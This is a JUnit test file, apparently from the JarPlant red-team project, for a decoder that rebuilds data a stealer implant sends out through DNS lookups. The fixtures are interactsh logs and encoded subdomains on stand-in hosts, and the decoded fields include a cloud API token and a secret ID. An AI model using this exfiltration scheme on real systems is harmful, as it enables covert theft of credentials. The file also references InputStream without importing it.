package io.github.w1th4d.jarplant.implants.utils;

import org.junit.Ignore;
import org.junit.Test;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;

import static org.junit.Assert.*;

public class StealerExfilDecoderTests {
    @Test
    public void testFindFqdns_InteractchRequestOutput_Fqdn() throws IOException {
        // Arrange
        String copyPasteFromInteractsh = ";; opcode: QUERY, status: NOERROR, id: 62053\n" +
                ";; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1\n" +
                "\n" +
                ";; OPT PSEUDOSECTION:\n" +
                "; EDNS: version 0; flags: do; udp: 1232\n" +
                "\n" +
                ";; QUESTION SECTION:\n" +
                ";some-data-field.1379621077.abc123.oast.fun.\tIN\t AAAA\n";

        // Act
        StealerExfilDecoder decoder = StealerExfilDecoder.create("abc123.oast.fun");
        Set<String> fqdns = decoder.findFqdns(copyPasteFromInteractsh);

        // Assert
        assertFalse(fqdns.isEmpty());
        assertTrue(fqdns.contains("some-data-field.1379621077.abc123.oast.fun"));
    }

    @Test
    public void testFindFqdns_SeveralInteractchOutputs_Fqdn() throws IOException {
        // Arrange
        String copyPasteFromInteractsh = ";; opcode: QUERY, status: NOERROR, id: 62053\n" +
                ";; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1\n" +
                "\n" +
                ";; OPT PSEUDOSECTION:\n" +
                "; EDNS: version 0; flags: do; udp: 1232\n" +
                "\n" +
                ";; QUESTION SECTION:\n" +
                ";some-data-field.1379621077.abc123.oast.fun.\tIN\t AAAA\n" +
                // Another one:
                ";; opcode: QUERY, status: NOERROR, id: 62053\n" +
                ";; flags:; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1\n" +
                "\n" +
                ";; OPT PSEUDOSECTION:\n" +
                "; EDNS: version 0; flags: do; udp: 1232\n" +
                "\n" +
                ";; QUESTION SECTION:\n" +
                ";another-data-field.7701269731.abc123.oast.fun.\tIN\t AAAA\n";

        // Act
        StealerExfilDecoder decoder = StealerExfilDecoder.create("abc123.oast.fun");
        Set<String> fqdns = decoder.findFqdns(copyPasteFromInteractsh);

        // Assert
        assertFalse(fqdns.isEmpty());
        assertTrue(fqdns.contains("some-data-field.1379621077.abc123.oast.fun"));
        assertTrue(fqdns.contains("another-data-field.7701269731.abc123.oast.fun"));
    }

    @Test
    public void testFindFqdns_InteractchResponseOutput_Fqdn() throws IOException {
        // Arrange
        String copyPasteFromInteractsh = ";; opcode: QUERY, status: NOERROR, id: 62053\n" +
                ";; flags: qr aa; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2\n" +
                "\n" +
                ";; QUESTION SECTION:\n" +
                ";some-data-field.1379621077.abc123.oast.fun.\tIN\t AAAA\n" +
                "\n" +
                ";; ANSWER SECTION:\n" +
                "some-data-field.1379621077.abc123.oast.fun.\t3600\tIN\tA\t10.1.2.3\n" +
                "\n" +
                ";; AUTHORITY SECTION:\n" +
                "some-data-field.1379621077.abc123.oast.fun.\t3600\tIN\tNS\tns1.oast.fun.\n" +
                "some-data-field.1379621077.abc123.oast.fun.\t3600\tIN\tNS\tns2.oast.fun.\n" +
                "\n" +
                ";; ADDITIONAL SECTION:\n" +
                "ns1.oast.fun.\t3600\tIN\tA\t10.1.2.3\n" +
                "ns2.oast.fun.\t3600\tIN\tA\t10.1.2.3\n";

        // Act
        StealerExfilDecoder decoder = StealerExfilDecoder.create("abc123.oast.fun");
        Set<String> fqdns = decoder.findFqdns(copyPasteFromInteractsh);

        // Assert
        assertFalse(fqdns.isEmpty());
        assertTrue(fqdns.contains("some-data-field.1379621077.abc123.oast.fun"));
    }

    @Test
    public void testFindFqdns_SeveralInteractchResponseOutputs_Fqdn() throws IOException {
        // Arrange
        String copyPasteFromInteractsh = ";; opcode: QUERY, status: NOERROR, id: 62053\n" +
                ";; flags: qr aa; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2\n" +
                "\n" +
                ";; QUESTION SECTION:\n" +
                ";some-data-field.1379621077.abc123.oast.fun.\tIN\t AAAA\n" +
                "\n" +
                ";; ANSWER SECTION:\n" +
                "some-data-field.1379621077.abc123.oast.fun.\t3600\tIN\tA\t10.1.2.3\n" +
                "\n" +
                ";; AUTHORITY SECTION:\n" +
                "some-data-field.1379621077.abc123.oast.fun.\t3600\tIN\tNS\tns1.oast.fun.\n" +
                "some-data-field.1379621077.abc123.oast.fun.\t3600\tIN\tNS\tns2.oast.fun.\n" +
                "\n" +
                ";; ADDITIONAL SECTION:\n" +
                "ns1.oast.fun.\t3600\tIN\tA\t10.1.2.3\n" +
                "ns2.oast.fun.\t3600\tIN\tA\t10.1.2.3\n" +
                // Another one
                ";; opcode: QUERY, status: NOERROR, id: 62053\n" +
                ";; flags: qr aa; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2\n" +
                "\n" +
                ";; QUESTION SECTION:\n" +
                ";another-data-field.7701269731.abc123.oast.fun.\tIN\t AAAA\n" +
                "\n" +
                ";; ANSWER SECTION:\n" +
                "another-data-field.7701269731.abc123.oast.fun.\t3600\tIN\tA\t10.1.2.3\n" +
                "\n" +
                ";; AUTHORITY SECTION:\n" +
                "another-data-field.7701269731.abc123.oast.fun.\t3600\tIN\tNS\tns1.oast.fun.\n" +
                "another-data-field.7701269731.abc123.oast.fun.\t3600\tIN\tNS\tns2.oast.fun.\n" +
                "\n" +
                ";; ADDITIONAL SECTION:\n" +
                "ns1.oast.fun.\t3600\tIN\tA\t10.1.2.3\n" +
                "ns2.oast.fun.\t3600\tIN\tA\t10.1.2.3\n";

        // Act
        StealerExfilDecoder decoder = StealerExfilDecoder.create("abc123.oast.fun");
        Set<String> fqdns = decoder.findFqdns(copyPasteFromInteractsh);

        // Assert
        assertFalse(fqdns.isEmpty());
        assertTrue(fqdns.contains("some-data-field.1379621077.abc123.oast.fun"));
        assertTrue(fqdns.contains("another-data-field.7701269731.abc123.oast.fun"));
    }

    @Test
    public void testParseInteractchExport_InteractchFileExport_Fqdns() throws IOException {
        // Arrange
        String expectedDomainName = "abc123.oast.fun";
        String testFileName = "interactch_export_example.json";
        byte[] jsonBytes;
        try (InputStream resourceStream = getClass().getClassLoader().getResourceAsStream(testFileName)) {
            if (resourceStream == null) {
                throw new IOException("Cannot read resource file '" + testFileName + "'.");
            }
            jsonBytes = resourceStream.readAllBytes();
        }

        // Act
        StealerExfilDecoder decoder = StealerExfilDecoder.create(expectedDomainName);
        Set<String> foundFqdns = decoder.parseInteractchExport(jsonBytes);

        // Assert
        assertFalse("Found something", foundFqdns.isEmpty());
        assertEquals("Found exact number of queries", 130, foundFqdns.size());
    }

    @Test
    public void testDecodeRequests_OneRequest_DecodedData() throws Exception {
        // Arrange
        String baseDomain = "something.example.com";
        // Only 'host' and 'user':
        String request = "h80ylft7wlwk3gn5d1uggdgucea6j40v54zkg4vzwg9sj1b.860116749-0.something.example.com";

        // Act
        StealerExfilDecoder decoder = StealerExfilDecoder.create(baseDomain);
        Map<String, Map<String, String>> decodedData = decoder.decodeRequests(List.of(request));

        // Assert
        assertEquals(1, decodedData.size());
        assertTrue("Got ID right", decodedData.containsKey("860116749"));
        Map<String, String> fields = decodedData.get("860116749");
        assertEquals("Got hostname right", "test-host-01", fields.get("host"));
        assertEquals("Got username right", "service-user", fields.get("user"));
    }

    @Test
    public void testDecodeRequests_SeveralRequests_DecodedData() throws Exception {
        // Arrange
        String baseDomain = "something.example.com";
        List<String> requests = new ArrayList<>(4);
        requests.add("8se1aj857sjdyg5khofr.4jrq1mzr3ba0qezdc3cf.axy5h1e2movi97indkzn.l23gi4rn.1803173851-0.something.example.com");
        requests.add("541ahoy2jt7o0fkq24c5.z2lyw46ss75up0s0940i.eegrm2keoz6hqyaaacd1.1803173851-1.something.example.com");
        requests.add("k7at41cawtdro28xbdrz.eulez6hjfzvmmlxo5x10.nbuuqexd0s7d65by7nlu.1803173851-2.something.example.com");
        requests.add("122723rkvifdg3tu0xeb.1803173851-3.something.example.com");

        // Act
        StealerExfilDecoder decoder = StealerExfilDecoder.create(baseDomain);
        Map<String, Map<String, String>> decodedData = decoder.decodeRequests(requests);

        // Assert
        assertEquals("Found one ID", 1, decodedData.size());
        assertTrue("Got ID right", decodedData.containsKey("1803173851"));
        Map<String, String> fields = decodedData.get("1803173851");
        assertEquals("Found right amount of fields", 6, fields.size());
        assertEquals("Got hostname right", "test-host-01", fields.get("host"));
        assertEquals("Got username right", "service-user", fields.get("user"));
        assertEquals("Got OS right", "Linux v1.2.3-something4", fields.get("os"));
        assertEquals("Got JVM right", "UberJDK v1.2.3-something4", fields.get("jvm"));
        assertEquals("Got CLOUD_SECRET_UID right", "secret-id", fields.get("CLOUD_SECRET_UID"));
        assertEquals("Got CLOUD_API_TOKEN right", "super-sensitive-api-token", fields.get("CLOUD_API_TOKEN"));
    }

    @Test
    public void testDecodeRequests_SeveralRequestsInRandomOrder_DecodedData() throws Exception {
        // Arrange
        String baseDomain = "something.example.com";
        List<String> requests = new ArrayList<>(4);
        requests.add("k7at41cawtdro28xbdrz.eulez6hjfzvmmlxo5x10.nbuuqexd0s7d65by7nlu.1803173851-2.something.example.com");
        requests.add("541ahoy2jt7o0fkq24c5.z2lyw46ss75up0s0940i.eegrm2keoz6hqyaaacd1.1803173851-1.something.example.com");
        requests.add("122723rkvifdg3tu0xeb.1803173851-3.something.example.com");
        requests.add("8se1aj857sjdyg5khofr.4jrq1mzr3ba0qezdc3cf.axy5h1e2movi97indkzn.l23gi4rn.1803173851-0.something.example.com");

        // Act
        StealerExfilDecoder decoder = StealerExfilDecoder.create(baseDomain);
        Map<String, Map<String, String>> decodedData = decoder.decodeRequests(requests);

        // Assert
        assertEquals("Found one ID", 1, decodedData.size());
        assertTrue("Got ID right", decodedData.containsKey("1803173851"));
        Map<String, String> fields = decodedData.get("1803173851");
        assertEquals("Found right amount of fields", 6, fields.size());
        assertEquals("Got hostname right", "test-host-01", fields.get("host"));
        assertEquals("Got username right", "service-user", fields.get("user"));
        assertEquals("Got OS right", "Linux v1.2.3-something4", fields.get("os"));
        assertEquals("Got JVM right", "UberJDK v1.2.3-something4", fields.get("jvm"));
        assertEquals("Got CLOUD_SECRET_UID right", "secret-id", fields.get("CLOUD_SECRET_UID"));
        assertEquals("Got CLOUD_API_TOKEN right", "super-sensitive-api-token", fields.get("CLOUD_API_TOKEN"));
    }
}
